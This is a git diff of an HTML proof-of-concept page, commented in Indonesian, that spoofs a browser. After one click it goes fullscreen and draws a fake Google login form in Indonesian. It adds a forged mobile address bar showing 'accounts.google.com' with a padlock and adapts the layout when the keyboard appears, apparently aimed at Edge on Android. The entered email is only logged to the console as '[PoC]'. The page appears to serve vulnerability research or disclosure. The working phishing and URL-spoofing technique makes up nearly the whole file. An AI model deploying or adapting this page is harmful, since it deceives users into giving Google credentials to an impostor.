@@ -1,125 +1,185 @@
-<html onclick="main()">
-<center>
-<h1 style="font-family: sans-serif;">Click to login</h1>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background: #fff;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        /* Container utama */
+        #app-container {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+        }
+        /* Form Area - menggunakan flex agar dinamis terhadap keyboard */
+        #form-area {
+            flex: 1;
+            overflow-y: auto;
+            text-align: center;
+            padding: 40px 0 20px 0;
+            box-sizing: border-box;
+            transition: padding 0.3s ease;
+        }
+        /* Address Bar Bawah Palsu */
+        #fake-address-bar {
+            background: #202124;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+            z-index: 9999;
+            transition: transform 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+
+<center style="position: fixed; z-index: 0; top: 50%; left: 50%; transform: translate(-50%, -50%);">
+    <h1 style="font-family: sans-serif;">Click to login</h1>
 </center>
 
-<script>
-function main() {
-    // 1. Fullscreen
-    var fsEl = document.getElementById('fullscreenElement');
-    if (fsEl.requestFullscreen) {
-        fsEl.requestFullscreen().catch(err => console.log(err));
-    }
+<!-- Layer Utama (Awalnya kosong) -->
+<div id="app-container" style="display: none;">
+    <div id="form-area">
+        <!-- Logo Google -->
+        <div style="margin-bottom: 10px;">
+            <svg viewBox="0 0 74 24" style="width: 74px; height: 24px;">
+                <path fill="#4285F4" d="M9.24 8.28c0-.72-.06-1.4-.18-2.04H4.8v3.84h2.52c-.12.72-.48 1.32-1.02 1.68v1.44h1.62c.96-.84 1.32-2.16 1.32-3.6z"/>
+                <path fill="#34A853" d="M4.8 12.72c1.32 0 2.4-.42 3.18-1.14l-1.62-1.44c-.48.36-1.08.54-1.62.54-1.26 0-2.34-.84-2.7-2.04H.36v1.5c.84 1.68 2.46 2.58 4.44 2.58z"/>
+                <path fill="#FBBC05" d="M2.1 8.64c-.12-.36-.18-.72-.18-1.14s.06-.78.18-1.14V4.86H.36c-.36.78-.54 1.62-.54 2.58s.18 1.8.54 2.58l1.74-1.38z"/>
+                <path fill="#EA4335" d="M4.8 3.6c.72 0 1.44.24 1.98.72l1.44-1.44C7.26 1.92 6.12 1.5 4.8 1.5c-1.98 0-3.6.9-4.44 2.58l1.74 1.5c.36-1.2 1.44-1.98 2.7-1.98z"/>
+                <text x="16" y="17" font-family="'Product Sans', Arial, sans-serif" font-size="18" fill="#5f6368" font-weight="500">Google</text>
+            </svg>
+        </div>
 
-    // 2. Pointer Lock (Opsional, dibungkus try-catch agar tidak error di HP)
-    var lockEl = document.getElementById('pointerLockElement');
-    if (lockEl.requestPointerLock) {
-        try { lockEl.requestPointerLock(); } catch(e) {}
-    }
+        <h2 style="font-size: 24px; color: #202124; font-weight: 400; margin: 0 0 10px 0;">Login</h2>
+        <p style="font-size: 15px; color: #202124; margin-bottom: 30px;">Gunakan Akun Google Anda</p>
 
-    // 3. Render UI
-    var div = document.getElementById('pointerLockElement');
-    div.innerHTML = `
-        <!-- ===== KONTEN FORM LOGIN (DI-FIX AGAR TIDAK BERANTAKAN SAAT KEYBOARD MUNCUL) ===== -->
-        <!-- Padding-top disesuaikan agar form berada di tengah atas -->
-        <div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #fff; font-family: 'Roboto', Arial, sans-serif; text-align: center; padding-top: 50px; padding-bottom: 120px; overflow-y: auto; box-sizing: border-box;">
-            
-            <!-- Logo Google -->
-            <div style="margin-bottom: 10px;">
-                <svg viewBox="0 0 74 24" style="width: 74px; height: 24px;">
-                    <path fill="#4285F4" d="M9.24 8.28c0-.72-.06-1.4-.18-2.04H4.8v3.84h2.52c-.12.72-.48 1.32-1.02 1.68v1.44h1.62c.96-.84 1.32-2.16 1.32-3.6z"/>
-                    <path fill="#34A853" d="M4.8 12.72c1.32 0 2.4-.42 3.18-1.14l-1.62-1.44c-.48.36-1.08.54-1.62.54-1.26 0-2.34-.84-2.7-2.04H.36v1.5c.84 1.68 2.46 2.58 4.44 2.58z"/>
-                    <path fill="#FBBC05" d="M2.1 8.64c-.12-.36-.18-.72-.18-1.14s.06-.78.18-1.14V4.86H.36c-.36.78-.54 1.62-.54 2.58s.18 1.8.54 2.58l1.74-1.38z"/>
-                    <path fill="#EA4335" d="M4.8 3.6c.72 0 1.44.24 1.98.72l1.44-1.44C7.26 1.92 6.12 1.5 4.8 1.5c-1.98 0-3.6.9-4.44 2.58l1.74 1.5c.36-1.2 1.44-1.98 2.7-1.98z"/>
-                    <text x="16" y="17" font-family="'Product Sans', Arial, sans-serif" font-size="18" fill="#5f6368" font-weight="500">Google</text>
+        <!-- Input Email -->
+        <div style="position: relative; width: 85%; margin: 0 auto 15px auto; text-align: left;">
+            <input id="pocEmail" type="email" placeholder=" " autocomplete="off"
+                style="width: 100%; padding: 16px 14px; border: 1px solid #747775; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; background: transparent; z-index: 2; position: relative; transition: 0.2s;" 
+                onfocus="this.style.border='2px solid #1a73e8'; this.nextElementSibling.style.color='#1a73e8';"
+                onblur="this.style.border='1px solid #747775'; this.nextElementSibling.style.color='#5f6368';">
+            <label style="position: absolute; left: 12px; top: -8px; background: #fff; padding: 0 4px; font-size: 12px; color: #5f6368; z-index: 3; pointer-events: none;">Email atau nomor telepon</label>
+        </div>
+
+        <div style="width: 85%; margin: 0 auto 30px auto; text-align: left;">
+            <a href="#" style="color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none;">Lupa email?</a>
+        </div>
+
+        <div style="width: 85%; margin: 0 auto 40px auto; text-align: left; font-size: 14px; color: #202124; line-height: 1.5;">
+            Bukan komputer Anda? Gunakan jendela penjelajahan rahasia untuk login.<br>
+            <a href="#" style="color: #1a73e8; font-weight: 500; text-decoration: none;">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
+        </div>
+
+        <div style="width: 85%; margin: 0 auto; display: flex; justify-content: space-between; align-items: center;">
+            <a href="#" style="color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none;">Buat akun</a>
+            <button id="pocBtn" style="padding: 10px 24px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500;">Berikutnya</button>
+        </div>
+    </div>
+
+    <!-- ===== ADDRESS BAR PALSU (TEMA GELAP & MENU BAWAH) ===== -->
+    <div id="fake-address-bar">
+        <div style="display: flex; align-items: center; padding: 8px 12px; gap: 12px;">
+            <div style="width: 28px; height: 28px; border-radius: 50%; background: conic-gradient(#4285F4 0deg 90deg, #EA4335 90deg 180deg, #FBBC05 180deg 270deg, #34A853 270deg 360deg); display: flex; justify-content: center; align-items: center; flex-shrink: 0;">
+                <div style="width: 14px; height: 14px; background: #202124; border-radius: 50%;"></div>
+            </div>
+
+            <div style="flex: 1; background: #35363a; border-radius: 20px; padding: 8px 12px; display: flex; align-items: center; justify-content: center; gap: 6px;">
+                <svg viewBox="0 0 24 24" style="width: 12px; height: 12px; fill: #9aa0a6; flex-shrink: 0;">
+                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                </svg>
+                <span style="color: #e8eaed; font-size: 14px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">accounts.google.com</span>
+            </div>
+
+            <div style="color: #e8eaed; font-size: 20px; flex-shrink: 0;">
+                <svg viewBox="0 0 24 24" style="width: 22px; height: 22px; fill: #e8eaed;">
+                    <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
                 </svg>
             </div>
-
-            <h2 style="font-size: 24px; color: #202124; font-weight: 400; margin: 0 0 10px 0;">Login</h2>
-            <p style="font-size: 15px; color: #202124; margin-bottom: 30px;">Gunakan Akun Google Anda</p>
-
-            <!-- Input Email -->
-            <div style="position: relative; width: 85%; margin: 0 auto 15px auto; text-align: left;">
-                <input id="pocEmail" type="email" placeholder=" " autocomplete="off"
-                    style="width: 100%; padding: 16px 14px; border: 1px solid #747775; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; background: transparent; z-index: 2; position: relative; transition: 0.2s;" 
-                    onfocus="this.style.border='2px solid #1a73e8'; this.nextElementSibling.style.color='#1a73e8';"
-                    onblur="this.style.border='1px solid #747775'; this.nextElementSibling.style.color='#5f6368';">
-                <label style="position: absolute; left: 12px; top: -8px; background: #fff; padding: 0 4px; font-size: 12px; color: #5f6368; z-index: 3; pointer-events: none;">Email atau nomor telepon</label>
-            </div>
-
-            <div style="width: 85%; margin: 0 auto 30px auto; text-align: left;">
-                <a href="#" style="color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none;">Lupa email?</a>
-            </div>
-
-            <div style="width: 85%; margin: 0 auto 40px auto; text-align: left; font-size: 14px; color: #202124; line-height: 1.5;">
-                Bukan komputer Anda? Gunakan jendela penjelajahan rahasia untuk login.<br>
-                <a href="#" style="color: #1a73e8; font-weight: 500; text-decoration: none;">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
-            </div>
-
-            <div style="width: 85%; margin: 0 auto; display: flex; justify-content: space-between; align-items: center;">
-                <a href="#" style="color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none;">Buat akun</a>
-                <button id="pocBtn" style="padding: 10px 24px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500;">Berikutnya</button>
-            </div>
         </div>
 
-        <!-- ===== ADDRESS BAR PALSU (TEMA GELAP & MENU BAWAH) ===== -->
-        <div style="position: fixed; left: 0; right: 0; bottom: 0; background: #202124; display: flex; flex-direction: column; box-sizing: border-box; font-family: 'Roboto', sans-serif; z-index: 9999;">
-            
-            <!-- Baris URL -->
-            <div style="display: flex; align-items: center; padding: 8px 12px; gap: 12px;">
-                <div style="width: 28px; height: 28px; border-radius: 50%; background: conic-gradient(#4285F4 0deg 90deg, #EA4335 90deg 180deg, #FBBC05 180deg 270deg, #34A853 270deg 360deg); display: flex; justify-content: center; align-items: center; flex-shrink: 0;">
-                    <div style="width: 14px; height: 14px; background: #202124; border-radius: 50%;"></div>
-                </div>
-
-                <div style="flex: 1; background: #35363a; border-radius: 20px; padding: 8px 12px; display: flex; align-items: center; justify-content: center; gap: 6px;">
-                    <svg viewBox="0 0 24 24" style="width: 12px; height: 12px; fill: #9aa0a6; flex-shrink: 0;">
-                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
-                    </svg>
-                    <span style="color: #e8eaed; font-size: 14px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">accounts.google.com</span>
-                </div>
-
-                <div style="color: #e8eaed; font-size: 20px; flex-shrink: 0;">
-                    <svg viewBox="0 0 24 24" style="width: 22px; height: 22px; fill: #e8eaed;">
-                        <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
-                    </svg>
-                </div>
-            </div>
-
-            <!-- Baris Menu Navigasi -->
-            <div style="display: flex; justify-content: space-around; align-items: center; padding: 10px 0 18px 0; border-top: 1px solid #35363a;">
-                <svg viewBox="0 0 24 24" style="width: 24px; height: 24px; fill: #e8eaed;"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
-                <svg viewBox="0 0 24 24" style="width: 24px; height: 24px; fill: #5f6368;"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
-                <svg viewBox="0 0 24 24" style="width: 26px; height: 26px; fill: #e8eaed;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
-                <div style="width: 22px; height: 22px; border: 2px solid #e8eaed; border-radius: 4px; display: flex; justify-content: center; align-items: center; color: #e8eaed; font-size: 12px; font-weight: bold;">1</div>
-                <svg viewBox="0 0 24 24" style="width: 24px; height: 24px; fill: #e8eaed;"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-            </div>
-            
-            <!-- Gesture Bar -->
-            <div style="width: 100%; height: 6px; background: #202124; display: flex; justify-content: center; align-items: center; padding-bottom: 6px;">
-                <div style="width: 40%; height: 4px; background: #9aa0a6; border-radius: 2px;"></div>
-            </div>
+        <div style="display: flex; justify-content: space-around; align-items: center; padding: 10px 0 18px 0; border-top: 1px solid #35363a;">
+            <svg viewBox="0 0 24 24" style="width: 24px; height: 24px; fill: #e8eaed;"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+            <svg viewBox="0 0 24 24" style="width: 24px; height: 24px; fill: #5f6368;"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+            <svg viewBox="0 0 24 24" style="width: 26px; height: 26px; fill: #e8eaed;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+            <div style="width: 22px; height: 22px; border: 2px solid #e8eaed; border-radius: 4px; display: flex; justify-content: center; align-items: center; color: #e8eaed; font-size: 12px; font-weight: bold;">1</div>
+            <svg viewBox="0 0 24 24" style="width: 24px; height: 24px; fill: #e8eaed;"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
         </div>
-    `;
+        
+        <div style="width: 100%; height: 6px; display: flex; justify-content: center; align-items: center; padding-bottom: 6px;">
+            <div style="width: 40%; height: 4px; background: #9aa0a6; border-radius: 2px;"></div>
+        </div>
+    </div>
+</div>
 
-    // 4. Auto trigger keyboard
-    // Diberi delay 800ms agar transisi fullscreen selesai dan layout tidak tabrakan
+<script>
+// Handler untuk klik di mana saja pada layar awal
+document.documentElement.addEventListener('click', function initApp(e) {
+    // Hapus event listener agar tidak trigger berulang
+    document.documentElement.removeEventListener('click', initApp);
+
+    // Sembunyikan tulisan "Click to login"
+    document.querySelector('center').style.display = 'none';
+
+    // Tampilkan UI Palsu
+    document.getElementById('app-container').style.display = 'flex';
+
+    // 1. Request Fullscreen (Edge Android mendukung ini pada interaksi user)
+    var docEl = document.documentElement;
+    if (docEl.requestFullscreen) {
+        docEl.requestFullscreen().catch(err => {
+            console.log("Fullscreen ditolak: ", err);
+        });
+    }
+
+    // 2. Auto trigger keyboard dengan delay
     setTimeout(function () {
         var email = document.getElementById('pocEmail');
         if (email) {
             email.focus(); 
-            email.click(); 
+            email.click();
+            
+            // Scroll ke atas agar input tidak tertutup UI
+            document.getElementById('form-area').scrollTop = 0;
         }
-    }, 800); 
+    }, 600);
+});
+
+// 3. Deteksi Virtual Keyboard via visualViewport (Sangat penting untuk Edge Android)
+// Ini berfungsi agar UI form beradaptasi jika keyboard bawaan menutupi layar
+if (window.visualViewport) {
+    const formArea = document.getElementById('form-area');
+    const fakeBar = document.getElementById('fake-address-bar');
+    
+    window.visualViewport.addEventListener('resize', () => {
+        // Jika keyboard muncul, visualViewport.height akan mengecil
+        const keyboardVisible = window.visualViewport.height < window.innerHeight * 0.8;
+        
+        if (keyboardVisible) {
+            // Jika keyboard muncul, kita bisa sembunyikan address bar palsu sementara
+            // agar form lega, atau sesuaikan padding-nya.
+            fakeBar.style.transform = 'translateY(100%)'; 
+            formArea.style.paddingTop = '15px'; // Form naik sedikit agar pas di atas keyboard
+        } else {
+            fakeBar.style.transform = 'translateY(0)';
+            formArea.style.paddingTop = '40px'; // Kembalikan padding normal
+        }
+    });
 }
 
-document.addEventListener('click', function (e) {
-    if (e.target && e.target.id === 'pocBtn') {
-        var email = document.getElementById('pocEmail');
-        console.log('[PoC] Email:', email ? email.value : '');
-    }
+// Handler tombol Next
+document.getElementById('pocBtn').addEventListener('click', function() {
+    var email = document.getElementById('pocEmail');
+    console.log('[PoC] Email:', email ? email.value : '');
 });
 </script>
 
-<div id="pointerLockElement" style="background:#fff;min-height:100vh;"></div>
-<div id="fullscreenElement" style="background:#fff;min-height:100vh;"></div>
+</body>
 </html>
